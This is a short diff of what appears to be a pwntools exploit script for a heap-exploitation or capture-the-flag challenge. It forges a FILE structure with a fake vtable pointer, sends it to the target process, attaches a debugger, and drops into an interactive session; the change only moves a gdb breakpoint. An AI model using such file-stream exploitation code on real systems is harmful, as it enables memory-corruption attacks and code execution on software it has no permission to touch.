@@ -28,7 +28,7 @@ fake_io_file+=p64(heap_addr+0xd8)#vtable
 
 p.sendafter(b': ',fake_io_file)
 
-gdb.attach(p,'b _IO_flush_all_lockp')
+gdb.attach(p,'b malloc')
 p.sendlineafter(b'> ',b'1')
 
 p.interactive()
